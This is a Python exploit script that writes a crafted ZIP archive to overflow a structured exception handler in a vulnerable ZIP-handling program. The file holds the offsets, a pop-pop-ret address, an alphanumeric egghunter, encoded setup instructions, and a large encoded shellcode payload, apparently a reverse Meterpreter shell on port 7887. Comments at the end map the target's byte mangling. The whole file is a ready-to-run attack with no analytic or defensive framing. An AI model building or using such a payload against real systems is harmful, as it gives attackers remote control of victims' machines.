#!/usr/bin/env python

from os import remove
from struct import pack

filename = "zipper_bomb.zip"
payload_ext = ".txt"
nseh_offset = 1022
as_offset = 899
bs_offset = 123
max_size = 4068
ldf_header = (
    "\x50\x4B\x03\x04\x14\x00\x00"
    "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00"
)

cdf_header = (
    "\x50\x4B\x01\x02\x14\x00\x14"
    "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00\x00\x00\x00\x01\x00"
    "\x24\x00\x00\x00\x00\x00\x00\x00"
)

eofcdf_header = (
    "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
    "\x12\x10\x00\x00"  # Size of central directory (bytes)
    "\x02\x10\x00\x00"  # Offset of start of central directory,
    # relative to start of archive
    "\x00\x00"
)

encoded_egghunter = "WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI3VmQZjyovosr0R1zdBaHhM4nWLGuCjBTzOH8pw4pdpt4Nk8zLo1eKZLoRU8gyojGAA"
encoded_edi = "\x2D\x30\x58\x4E\x55"     #SUB EAX, 554E5830
encoded_edi += "\x2D\x30\x58\x4E\x55"     #SUB EAX, 554E5830
encoded_edi += "\x2D\x30\x5A\x50\x55"     #SUB EAX, 55505A30    
encoded_edi += "\x50"     #PUSH EAX
encoded_edi += "\x5E"     #POP ESI
encoded_edi += "\x50"     #PUSH EAX
encoded_edi += "\x5F"     #POP ESI
encoded_edi += "\x98\x91"

rev_met_7887 =  "w00tw00t"
rev_met_7887 += "\xd9\xea\xd9\x74\x24\xf4\x5a\x4a\x4a\x4a\x4a"
rev_met_7887 += "\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43"
rev_met_7887 += "\x43\x43\x37\x52\x59\x6a\x41\x58\x50\x30\x41"
rev_met_7887 += "\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
rev_met_7887 += "\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42"
rev_met_7887 += "\x75\x4a\x49\x49\x6c\x58\x68\x6d\x52\x37\x70"
rev_met_7887 += "\x67\x70\x45\x50\x61\x70\x6e\x69\x6a\x45\x36"
rev_met_7887 += "\x51\x4b\x70\x62\x44\x6c\x4b\x72\x70\x70\x30"
rev_met_7887 += "\x4e\x6b\x71\x42\x46\x6c\x6e\x6b\x63\x62\x74"
rev_met_7887 += "\x54\x4c\x4b\x33\x42\x75\x78\x44\x4f\x48\x37"
rev_met_7887 += "\x30\x4a\x64\x66\x56\x51\x59\x6f\x4e\x4c\x57"
rev_met_7887 += "\x4c\x63\x51\x61\x6c\x34\x42\x74\x6c\x77\x50"
rev_met_7887 += "\x49\x51\x7a\x6f\x54\x4d\x66\x61\x4a\x67\x6b"
rev_met_7887 += "\x52\x38\x72\x36\x32\x56\x37\x6e\x6b\x73\x62"
rev_met_7887 += "\x32\x30\x6c\x4b\x30\x4a\x77\x4c\x4e\x6b\x62"
rev_met_7887 += "\x6c\x67\x61\x30\x78\x48\x63\x43\x78\x47\x71"
rev_met_7887 += "\x4b\x61\x30\x51\x4e\x6b\x36\x39\x55\x70\x57"
rev_met_7887 += "\x71\x69\x43\x4e\x6b\x51\x59\x76\x78\x4b\x53"
rev_met_7887 += "\x55\x6a\x62\x69\x4c\x4b\x64\x74\x4e\x6b\x75"
rev_met_7887 += "\x51\x59\x46\x66\x51\x39\x6f\x4c\x6c\x6b\x71"
rev_met_7887 += "\x4a\x6f\x46\x6d\x45\x51\x39\x57\x65\x68\x69"
rev_met_7887 += "\x70\x53\x45\x49\x66\x53\x33\x33\x4d\x79\x68"
rev_met_7887 += "\x65\x6b\x33\x4d\x34\x64\x72\x55\x58\x64\x66"
rev_met_7887 += "\x38\x4c\x4b\x50\x58\x71\x34\x46\x61\x6b\x63"
rev_met_7887 += "\x31\x76\x4e\x6b\x36\x6c\x62\x6b\x6e\x6b\x73"
rev_met_7887 += "\x68\x37\x6c\x67\x71\x68\x53\x4c\x4b\x35\x54"
rev_met_7887 += "\x6c\x4b\x53\x31\x4a\x70\x6c\x49\x67\x34\x31"
rev_met_7887 += "\x34\x55\x74\x51\x4b\x33\x6b\x50\x61\x53\x69"
rev_met_7887 += "\x51\x4a\x56\x31\x6b\x4f\x4d\x30\x33\x6f\x31"
rev_met_7887 += "\x4f\x53\x6a\x6e\x6b\x56\x72\x6a\x4b\x4c\x4d"
rev_met_7887 += "\x71\x4d\x35\x38\x75\x63\x75\x62\x47\x70\x75"
rev_met_7887 += "\x50\x30\x68\x74\x37\x53\x43\x66\x52\x31\x4f"
rev_met_7887 += "\x53\x64\x71\x78\x42\x6c\x63\x47\x76\x46\x67"
rev_met_7887 += "\x77\x6b\x39\x39\x78\x39\x6f\x78\x50\x48\x38"
rev_met_7887 += "\x4e\x70\x43\x31\x37\x70\x43\x30\x55\x79\x48"
rev_met_7887 += "\x44\x53\x64\x30\x50\x31\x78\x55\x79\x6b\x30"
rev_met_7887 += "\x42\x4b\x57\x70\x79\x6f\x48\x55\x50\x6a\x64"
rev_met_7887 += "\x4a\x30\x68\x4e\x4c\x66\x70\x6b\x70\x48\x6b"
rev_met_7887 += "\x62\x48\x63\x32\x43\x30\x37\x6e\x48\x4f\x4d"
rev_met_7887 += "\x59\x6b\x56\x52\x70\x32\x70\x70\x50\x36\x30"
rev_met_7887 += "\x61\x50\x42\x70\x73\x70\x56\x30\x35\x38\x4b"
rev_met_7887 += "\x5a\x74\x4f\x79\x4f\x59\x70\x39\x6f\x4a\x75"
rev_met_7887 += "\x6a\x37\x42\x4a\x62\x30\x70\x56\x56\x37\x52"
rev_met_7887 += "\x48\x6f\x69\x4d\x75\x63\x44\x45\x31\x39\x6f"
rev_met_7887 += "\x49\x45\x6f\x75\x6b\x70\x70\x74\x76\x6a\x69"
rev_met_7887 += "\x6f\x50\x4e\x34\x48\x52\x55\x68\x6c\x48\x68"
rev_met_7887 += "\x32\x47\x35\x50\x75\x50\x73\x30\x63\x5a\x57"
rev_met_7887 += "\x70\x61\x7a\x64\x44\x56\x36\x61\x47\x43\x58"
rev_met_7887 += "\x53\x32\x6b\x69\x5a\x68\x31\x4f\x69\x6f\x4a"
rev_met_7887 += "\x75\x6c\x43\x6a\x58\x63\x30\x63\x4e\x47\x46"
rev_met_7887 += "\x6c\x4b\x66\x56\x71\x7a\x33\x70\x55\x38\x45"
rev_met_7887 += "\x50\x62\x30\x75\x50\x63\x30\x76\x36\x30\x6a"
rev_met_7887 += "\x35\x50\x51\x78\x52\x78\x6c\x64\x43\x63\x48"
rev_met_7887 += "\x65\x4b\x4f\x7a\x75\x4f\x63\x63\x63\x50\x6a"
rev_met_7887 += "\x37\x70\x66\x36\x63\x63\x32\x77\x45\x38\x34"
rev_met_7887 += "\x42\x58\x59\x68\x48\x63\x6f\x39\x6f\x68\x55"
rev_met_7887 += "\x6e\x63\x7a\x58\x53\x30\x43\x4d\x54\x68\x43"
rev_met_7887 += "\x68\x30\x68\x37\x70\x31\x50\x47\x70\x53\x30"
rev_met_7887 += "\x61\x7a\x37\x70\x46\x30\x43\x58\x54\x4b\x74"
rev_met_7887 += "\x6f\x76\x6f\x66\x50\x49\x6f\x48\x55\x62\x77"
rev_met_7887 += "\x61\x78\x44\x35\x70\x6e\x52\x6d\x61\x71\x39"
rev_met_7887 += "\x6f\x48\x55\x31\x4e\x61\x4e\x49\x6f\x46\x6c"
rev_met_7887 += "\x47\x54\x44\x4f\x6b\x35\x32\x50\x79\x6f\x4b"
rev_met_7887 += "\x4f\x39\x6f\x6d\x39\x6d\x4b\x79\x6f\x6b\x4f"
rev_met_7887 += "\x4b\x4f\x46\x61\x38\x43\x47\x59\x59\x56\x61"
rev_met_7887 += "\x65\x5a\x61\x4a\x63\x6d\x6b\x5a\x50\x48\x35"
rev_met_7887 += "\x4f\x52\x62\x76\x30\x6a\x47\x70\x30\x53\x79"
rev_met_7887 += "\x6f\x4b\x65\x41\x41"

payload  = "Z" * 102
payload += encoded_egghunter
payload += "Z" * (as_offset - len(payload))
print "Size of payload: " + str(len(payload))
payload += "BBBB"
payload += encoded_edi
payload += "B" * (119-len(encoded_edi))
print "Size of payload: " + str(len(payload))
payload += "\x71\x9F\x70\x9F"
payload += pack("<L", 0x00451845)
payload += rev_met_7887
payload += "D" * (max_size - len(payload) - len(payload_ext))

payload = payload + payload_ext
payload_len = len(payload)

print("[*] Size : {length} bytes".format(length=payload_len))
print("[*] Removing old {filename} file".format(filename=filename))
try:
    remove(filename)
except OSError:
    print("[!] Couldn't remove, probably doesn't exist. Ignoring this error")
    pass
print("[*] Creating new {filename} file".format(filename=filename))
with open(filename, "w") as f:
    file_content = ldf_header + payload + cdf_header + payload + eofcdf_header
    f.write(file_content)

#original:  7e 7f 80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90
#mangled:   7E 7F C7 FC E9 E2 E4 E0 E5 E7 EA EB E8 EF EE EC C4 C5 C9  

#original:  91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0
#mangled:   E6 C6 F4 F6 F2 FB F9 FF D6 DC A2 A3 A5 50 83 E1   

#original:  a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0
#mangled: ED F3 FA F1 D1 AA BA BF AC AC BD BC A1 AB BB A6 A6 A6 A6 A6 A6 A6 2B 2B A6 A6 2B 2B 2B 2B 2B 2B     

#original:  c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0
#mangled:  2D 2D 2B 2D 2B A6 A6 2B 2B 2D 2D A6 2D 2B 2D 2D 2D 2D 2B 2B 2B 2B 2B 2B 2B 2B A6 5F A6 A6 AF 61          
